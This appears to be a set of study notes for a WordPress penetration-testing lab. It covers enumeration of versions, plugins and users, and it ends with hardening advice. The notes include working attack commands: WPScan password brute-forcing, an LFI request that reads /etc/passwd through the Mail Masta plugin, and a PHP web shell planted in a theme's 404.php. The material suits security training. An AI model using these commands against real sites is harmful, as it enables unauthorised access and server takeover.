# Default WordPress file structure

WordPress can be installed on a Windows, Linux, or Mac OSX host. For this module, we will focus on a default WordPress installation on an Ubuntu Linux web server. WordPress requires a fully installed and configured LAMP stack (Linux operating system, Apache HTTP Server, MySQL database, and the PHP programming language) before installation on a Linux host. After installation, all WordPress supporting files and directories will be accessible in the webroot located at **/var/www/html**.

Below is the directory structure of a default WordPress install, showing the key files and subdirectories necessary for the website to function properly:

```bash
tree -L 1 /var/www/html


.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

# Key WordPress files

The root directory of WordPress contains files that are needed to configure WordPress to function correctly.

- index.php is the homepage of WordPress;
- license.txt contains useful information such as the version WordPress installed;
- wp-activate.php is used for the email activation process when setting up a new WordPress site;
- wp-admin folder contains the login page for administrator access and the backend dashboard. Once a user has logged in, they can make changes to the site based on their assigned permissions. The login page can be located at one of the following paths:
    - /wp-admin/login.php
    - /wp-admin/wp-login.php
    - /login.php
    - /wp-login.php

This file can also be renamed to make it more challenging to find the login page.

```xmlrpc.php``` is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress REST API.

# WordPress Configuration File

The ```wp-config.php file``` contains information required by WordPress to connect to the database, such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.

```wp-config.php``` tipical structure:

```php
<?php
/** <SNIP> */
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** MySQL database username */
define( 'DB_USER', 'username_here' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password_here' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Authentication Unique Keys and Salts */
/* <SNIP> */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/** WordPress Database Table prefix */
$table_prefix = 'wp_';

/** For developers: WordPress debugging mode. */
/** <SNIP> */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

# Key WordPress directories

The ```wp-content``` folder is the main directory where plugins and themes are stored. The subdirectory **uploads/** is usually where any files uploaded to the platform are stored. These directories and files **should be carefully enumerated** as they may lead to contain sensitive data that could lead to remote code execution or exploitation of other vulnerabilities or misconfigurations.

### wp-content

```bash
tree -L 1 /var/www/html/wp-content


.
├── index.php
├── plugins
└── themes
```


### wp-includes

```wp-includes``` contains everything except for the administrative components and the themes that belong to the website. This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.

```bash
tree -L 1 /var/www/html/wp-includes



.
├── <SNIP>
├── theme.php
├── update.php
├── user.php
├── vars.php
├── version.php
├── widgets
├── widgets.php
├── wlwmanifest.xml
├── wp-db.php
└── wp-diff.php
```

# WordPress user roles

There are five types of users in a standard WordPress installation:
- Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code;
- Editor: An editor can publish and manage posts, including the posts of other users;
- Author: Authors can publish and manage their own posts;
- Contributor: These users can write and manage their own posts but cannot publish them;
- Subscriber: These are normal users who can browse posts and edit their profiles.

Gaining access as an administrator is usually needed to obtain code execution on the server. However, editors and authors might have access to certain vulnerable plugins that normal users do not.

<br>
<br>
<br>
<br>

# WordPress core version enumeration

It is always important to know what type of application we are working with. An essential part of the enumeration phase is uncovering the software version number. This is helpful when searching for common misconfigurations such as default passwords that may be set for certain versions of an application and searching for known vulnerabilities for a particular version number. We can use a variety of methods to discover the version number manually. 

**The first and easiest step is reviewing the page source code**.

### WP Version - Source Code

```html
...SNIP...
<link rel='https://api.w.org/' href='http://blog.inlanefreight.com/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.inlanefreight.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.3.3" />
...SNIP...
```

```bash
curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'


<meta name="generator" content="WordPress 5.3.3" />
```

Aside from version information, the source code may also contain comments that may be useful. Links to CSS (style sheets) and JS (JavaScript) can also provide hints about the version number.

In older WordPress versions, another source for uncovering version information is the ```readme.html``` file in WordPress's root directory.

<br>
<br>
<br>
<br>

# Plugins and themes enumeration

We can also find information about the installed plugins by reviewing the source code manually by inspecting the page source or filtering for the information using cURL and other command-line utilities.

```bash
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

```bash
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

However, not all installed plugins and themes can be discovered passively. In this case, we have to send requests to the server actively to enumerate them. We can do this by sending a GET request that points to a directory or file that may exist on the server. If the directory or file does exist, we will either gain access to the directory or file or will receive a redirect response from the webserver, indicating that the content does exist. However, we do not have direct access to it.

### Plugins active enumeration

```bash
curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
```

If the content does not exist, we will receive a 404 Not Found error. The same applies to installed themes.

# Directory indexing 

Active plugins should not be our only area of focus when assessing a WordPress website. **Even if a plugin is deactivated, it may still be accessible, and therefore we can gain access to its associated scripts and functions**. Deactivating a vulnerable plugin does not improve the WordPress site's security. It is best practice to either remove or keep up-to-date any unused plugins.

We can view the directory listing using cURL and convert the HTML output to a nice readable format using ```html2text```.

```bash
curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```

This type of access is called **Directory Indexing**. It allows us to navigate the folder and access files that may contain sensitive information or vulnerable code. It is best practice to disable directory indexing on web servers so a potential attacker cannot gain direct access to any files or folders other than those necessary for the website to function properly.

<br>
<br>
<br>
<br>

# User enumeration

### First method

The first method is reviewing posts to uncover the ID assigned to the user and their corresponding username. If we mouse over the post author link titled "by admin," a link to the user's account appears in the web browser's lower-left corner.

The admin user is usually assigned the user ID 1. We can confirm this by specifying the user ID for the author parameter in the URL.

```http://blog.inlanefreight.com/?author=1```

This can also be done with cURL from the command line. The HTTP response in the below output shows the author that corresponds to the user ID. The URL in the Location header confirms that this user ID belongs to the admin user:

```bash
curl -s -I http://blog.inlanefreight.com/?author=1



HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:47:08 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Redirect-By: WordPress
Location: http://blog.inlanefreight.com/index.php/author/admin/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

The above cURL request then redirects us to the user's profile page or the main login page. If the user does not exist, we receive a 404 Not Found error.


### Second method

The second method requires interaction with the JSON endpoint, which allows us to obtain a list of users. This was changed in WordPress core after version 4.7.1, and later versions only show whether a user is configured or not. Before this release, all users who had published a post were shown by default.

```bash
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq





[
  {
    "id": 1,
    "name": "admin",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/admin/",
    <SNIP>
  },
  {
    "id": 2,
    "name": "ch4p",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/ch4p/",
    <SNIP>
  },
<SNIP>
```

# Login

Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the xmlrpc.php page.

If our POST request against xmlrpc.php contains valid credentials, we will receive the following output:

```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php



<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

If the credentials are not valid, we will **receive a 403 faultCode** error.

<br>
<br>
<br>
<br>

# WPScan

There are various enumeration options that can be specified, such as vulnerable plugins, all plugins, user enumeration, and more. It is important to understand all of the options available to us and fine-tune the scanner depending on the goal (i.e., are we just interested to see if the WordPress site is using any vulnerable plugins, do we need to perform a full audit of all aspects of the site or are we just interested in creating a user list to use in a brute force password guessing attack?).

WPScan can pull in vulnerability information from external sources to enhance our scans. We can obtain an API token from WPVulnDB, which is used by WPScan to scan for vulnerability and exploit proof of concepts (POC) and reports. The free plan allows up to 50 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to WPScan using the --api-token parameter.

### Enumerating a website with WPScan

The ```--enumerate``` flag is used to enumerate various components of the WordPress application such as plugins, themes and users.

For example, all plugins can be enumerated using the arguments ```--enumerate ap```. Let's run a normal enumeration scan against a WordPress website.

Some examples:

```bash
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk
```

```bash
wpscan --url http://94.237.50.27:59949 --plugins-version-detection aggressive --plugins-list photo-gallery
```

<br>
<br>
<br>
<br>

### How to read a WPScan report, example

The report generated by WPScan tells us that the website uses an older version of WordPress (5.3.2) and an outdated theme called Twenty Twenty. WPScan identified two vulnerable plugins, Mail Masta 1.0 and Google Review Slider. This version of the Mail Masta plugin is known to be vulnerable to SQL Injection as well as Local File Inclusion (LFI). **The report output also contains URLs to PoCs, which provide information on how to exploit these vulnerabilities**.

Let's verify if the LFI can be exploited based on this exploit-db report. The exploit states that any unauthenticated user can read local files through the path: ```/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd```.

```bash
curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

We have successfully validated the vulnerability using the data generated in the WPScan report.


### WordPress user bruteforce

WPScan can be used to brute force usernames and passwords. The scan report returned three users registered on the website: admin, roger, and david. The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the normal WordPress login page, while the xmlrpc method uses the WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it is faster.

```bash
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```

Another command:
```bash
wpscan  --url http://blog.inlanefreight.local/ -U erika --passwords Tools/Wordlists/rockyou.txt
```

# RCE via theme editor

With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack:
- Log in to WordPress with the administrator credentials, which should redirect us to the admin panel;
- Click on Appearance on the side panel and select Theme Editor. This page will allow us to edit the PHP source code directly;
- We should select an inactive theme in order to avoid corrupting the main theme.

We can see that the active theme is Transportex so an unused theme such as Twenty Seventeen should be chosen instead.

Choose a theme and click on Select. Next, choose a non-critical file such as 404.php to modify and add a web shell.

Twenty Seventeen Theme - 404.php:

```bash
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

The above code should allow us to execute commands via the GET parameter cmd. In this example, we modified the source code of the 404.php page and added a new function called system(). This function will allow us to directly execute operating system commands by sending a GET request and appending the cmd parameter to the end of the URL after a question mark ? and specifying an operating system command. The modified URL should look like this **404.php?cmd=id**.

```bash
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

<br>
<br>
<br>
<br>

# WordPress hardening

### Perform regular updates

Make sure that WordPress core, as well as all installed plugins and themes, are kept up-to-date. The WordPress admin console will usually prompt us when plugins or themes need to be updated or when WordPress itself requires an upgrade. We can even modify the wp-config.php file to enable automatic updates by inserting the following lines: 

```php
define( 'WP_AUTO_UPDATE_CORE', true );
```

```php
add_filter( 'auto_update_plugin', '__return_true' );
```

```php
add_filter( 'auto_update_theme', '__return_true' );
```

### Enhance WordPress security

There are a lot of security plugins for WP. These plugins can be used as a WAF, a malware scanner, activity auditing and so on.

- Sucuri security: this plugin consist in the following features:
  - Security activity auditing;
  - File intigrity monitoring;
  - Remote malware scanning;
  - Blacklist monitoring.

- IThemes Security: this plugin consist in a lot of features such as:
  - 2FA;
  - WordPress salts and security keys;
  - Google reCAPTCHA;
  - User action logging.

- Wordfence security: consists of an endpoint firewall and malware scanner:
  - The WAF identifies and blocks malicious traffic;
  - The premium version provides real-time firewall rule and malware signature updates;
  - Premium also enables real-time IP blacklisting to block all requests from known most malicious IPs.


Users are often targeted as they are generally seen as the weakest link in an organization. The following user-related best practices will help improve the overall security of a WordPress site:
- Disable the standard admin user and create accounts with difficult to guess usernames;
- Enforce strong passwords;
- Enable and enforce two-factor authentication for all users;
- Restrict users' access based on the concept of least privilege;
- Periodically audit user rights and access;
- Limit login attempts to prevent password brute-forcing attacks;
- Rename the wp-admin.php login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses.


